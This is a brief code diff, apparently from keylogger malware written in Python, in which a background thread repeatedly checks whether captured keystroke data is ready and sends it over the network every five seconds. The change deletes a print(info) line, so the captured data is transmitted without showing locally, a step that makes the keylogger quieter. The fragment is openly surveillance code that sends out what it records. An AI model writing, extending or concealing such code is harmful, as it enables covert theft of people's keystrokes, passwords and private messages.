@@ -45,7 +45,6 @@ class KeyChecker(threading.Thread):
         while True:
             if self.keylogger.hasInfoToSend():
                 info = self.keylogger.getInfo()
-                print(info)
                 net.send(info)
             time.sleep(5)
 
